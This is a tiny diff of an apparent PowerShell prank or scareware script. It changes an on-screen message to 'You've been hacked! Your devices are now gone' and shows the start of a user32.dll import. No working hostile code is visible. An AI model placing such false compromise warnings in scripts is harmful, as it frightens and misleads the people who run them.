@@ -1,4 +1,4 @@
-Write-Host "`nYou've been hacked!`n"
+Write-Host "`nYou've been hacked! Your devices are now gone`n"
 
 $code = @"
     [DllImport("user32.dll")]
